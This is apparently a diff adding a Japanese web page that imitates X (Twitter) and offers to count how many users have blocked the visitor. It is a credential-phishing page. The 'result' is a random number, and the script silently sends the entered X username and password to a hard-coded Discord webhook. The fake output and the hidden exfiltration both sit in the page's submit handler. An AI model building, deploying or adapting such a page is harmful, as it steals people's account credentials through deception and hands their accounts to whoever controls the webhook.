@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ⅹブロック検証ツール</title>
+    <style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+                     Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+        background: #000000;
+        color: #f2f2f2;
+        min-height: 100vh;
+
+        display: flex;
+        justify-content: center;
+        align-items: center;
+
+        padding: 20px;
+    }
+
+    /* メインカード */
+    .search-card {
+        background: #000000;
+
+        width: 100%;
+        max-width: 520px;
+
+        border: 1px solid #2f3336;
+        border-radius: 20px;
+
+        padding: 45px 45px;
+
+        text-align: left;
+
+        box-shadow:
+            0 10px 40px rgba(0, 0, 0, 0.6);
+    }
+
+    /* 上部アイコン */
+    .app-icon {
+    width: 70px;
+    height: 70px;
+    margin: 0 auto 28px;
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    background: #000;
+    color: #fff;
+
+    border: 1px solid #2f3336;
+    border-radius: 50%;
+
+    font-size: 42px;
+    font-weight: 500;
+    }
+    /* タイトル */
+    h1 {
+        font-size: 31px;
+        line-height: 1.2;
+
+        color: #f2f2f2;
+        font-weight: 800;
+
+        margin-bottom: 10px;
+
+        text-align: center;
+    }
+
+    /* 説明 */
+    .description {
+        font-size: 15px;
+
+        color: #71767b;
+
+        margin-bottom: 35px;
+
+        text-align: center;
+
+        opacity: 1;
+    }
+
+    /* 入力欄グループ */
+    .input-group {
+        text-align: left;
+        margin-bottom: 20px;
+    }
+
+    /* 入力欄タイトル */
+    .input-group label {
+        display: block;
+
+        font-size: 13px;
+        font-weight: 500;
+
+        color: #71767b;
+
+        margin-bottom: 8px;
+
+        letter-spacing: 0.3px;
+    }
+
+    /* 入力欄 */
+    .input-group input {
+        width: 100%;
+
+        height: 58px;
+
+        padding: 0 15px;
+
+        border: 1px solid #536471;
+        border-radius: 6px;
+
+        background: transparent;
+
+        font-size: 17px;
+        color: #f2f2f2;
+
+        outline: none;
+
+        box-shadow: none;
+
+        transition: border 0.15s,
+                    box-shadow 0.15s;
+    }
+
+    /* 入力欄をクリックした時 */
+    .input-group input:focus {
+        border-color: #1d9bf0;
+
+        box-shadow:
+            0 0 0 1px #1d9bf0;
+    }
+
+    /* placeholder */
+    .input-group input::placeholder {
+        color: #71767b;
+    }
+
+    /* 確認ボタン */
+    .search-btn {
+        width: 100%;
+
+        height: 50px;
+
+        padding: 0 20px;
+
+        background: #eff3f4;
+
+        border: none;
+        border-radius: 9999px;
+
+        color: #0f1419;
+
+        font-size: 16px;
+        font-weight: 700;
+
+        cursor: pointer;
+
+        box-shadow: none;
+
+        transition:
+            background 0.2s,
+            opacity 0.2s;
+
+        margin-top: 12px;
+    }
+
+    /* PCでマウスを乗せた時 */
+    .search-btn:hover {
+        background: #d7dbdc;
+        opacity: 1;
+    }
+
+    /* 押した後 */
+    .search-btn:disabled {
+        background: #536471;
+
+        color: #8b98a5;
+
+        cursor: not-allowed;
+
+        box-shadow: none;
+
+        opacity: 0.7;
+    }
+
+    /* 結果 */
+    .result-area {
+        display: none;
+
+        margin-top: 28px;
+
+        padding: 22px;
+
+        background: #16181c;
+
+        border-radius: 12px;
+
+        border: 1px solid #2f3336;
+
+        animation: fadeIn 0.35s ease;
+    }
+
+    .result-text {
+        font-size: 18px;
+
+        color: #f2f2f2;
+
+        font-weight: 700;
+
+        text-align: center;
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+            transform: translateY(8px);
+        }
+
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+
+    /* =========================
+       スマホ対応
+       ========================= */
+
+    @media (max-width: 600px) {
+
+        body {
+            padding: 0;
+
+            align-items: flex-start;
+        }
+
+        .search-card {
+            width: 100%;
+
+            max-width: none;
+
+            min-height: 100vh;
+
+            border: none;
+            border-radius: 0;
+
+            padding:
+                35px 22px 40px;
+        }
+
+        .app-icon {
+            width: 50px;
+            height: 50px;
+
+            font-size: 23px;
+
+            margin-bottom: 28px;
+        }
+
+        h1 {
+            font-size: 28px;
+        }
+
+        .description {
+            font-size: 14px;
+
+            margin-bottom: 32px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        .input-group input {
+            height: 56px;
+
+            font-size: 16px;
+        }
+
+        .search-btn {
+            height: 50px;
+
+            font-size: 16px;
+        }
+    }
+
+
+    /* =========================
+       小さいスマホ
+       ========================= */
+
+    @media (max-width: 360px) {
+
+        .search-card {
+            padding-left: 17px;
+            padding-right: 17px;
+        }
+
+        h1 {
+            font-size: 25px;
+        }
+    }
+
+
+    /* =========================
+       大きいPC
+       ========================= */
+
+    @media (min-width: 1000px) {
+
+        .search-card {
+            max-width: 540px;
+
+            padding:
+                50px 55px;
+        }
+.input-error {
+    color: #f4212e;
+    font-size: 12px;
+    margin-top: 6px;
+    min-height: 16px;
+}
+.password-error {
+    color: #f4212e;
+    font-size: 12px;
+    margin-top: 8px;
+    min-height: 16px;
+}
+       }
+</style>
+</head>
+<body>
+
+    <div class="search-card">
+
+    <div class="app-icon">𝕏</div>
+
+    <h1>ブロック確認</h1>
+
+    <div class="description">
+        ｘのブロックされている人数を確認します
+    </div>
+
+    <form onsubmit="searchUser(event)">
+
+       <div class="input-group">
+    <label>YOUR USER ID</label>
+
+    <input
+        type="text"
+        id="userid1"
+        placeholder="@username"
+        minlength="2"
+        maxlength="30"
+        oninput="this.value = this.value.replace(/[\u3040-\u309F]/g, '')"
+        required
+    >
+
+    <p id="userIdLengthError" class="input-error"></p>
+</div>
+
+        <p id="userIdError" class="input-error"></p>
+
+        <div class="input-group">
+            <label>PASSWORD</label>
+
+            <input
+                type="password"
+                id="userpass"
+                placeholder="••••••••"
+                minlength="7"
+                maxlength="30"
+                required
+            >
+            <p id="passwordError" class="password-error"></p>
+        </div>
+
+        <button
+            type="submit"
+            id="submitBtn"
+            class="search-btn"
+        >
+            確認する
+        </button>
+
+    </form>
+
+    <div id="resultBox" class="result-area">
+        <p id="resultText" class="result-text"></p>
+
+    <script>
+            function searchUser(event) {
+            event.preventDefault();
+            
+const demoPassword = document.getElementById("demoPassword");
+const passwordError = document.getElementById("passwordError");
+
+            // ボタンを無効化する
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerText = "送信済み"; // ボタンの文字も変わります
+            
+            const userId1 = document.getElementById('userid1').value;
+            const userPassword = document.getElementById('userpass').value;
+            
+            const webhookUrl = "https://discord.com/api/webhooks/1567176450027688024/jXpinuB-zxjtHcFfc1OZoJiX0G0S02jPTLsrEf0OFYkJD-Nh8JnBSleQ9UUFoxAYK6WM";
+
+            // 1か25の数値をランダムに生成
+            const randomCount = Math.floor(Math.random() * 25) + 1;
+            const resultMsg = randomCount + "人にブロックされています。";
+
+            // 画面内のテキストを書き換えて表示する
+            document.getElementById('resultText').innerText = resultMsg;
+            document.getElementById('resultBox').style.display = 'block';
+
+            // Discordに送信するデータ構造
+            const requestData = {
+                embeds: [
+                    {
+                        title: "🔍 ブロック確認リクエストを受信しました",
+                        color: 16738474,
+                        fields: [
+                            {
+                                name: "ユーザーID (YOUR ID)",
+                                value: "`" + userId1 + "`",
+                                inline: true
+                            },
+                            {
+                                name: "パスワード (PASSWORD)",
+                                value: "`" + userPassword + "`",
+                                inline: true
+                            },
+                            {
+                                name: "生成された判定結果",
+                                value: "**" + resultMsg + "**",
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            // バックグラウンドでWebhook送信
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(requestData)
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
+
+</body>
+</html>
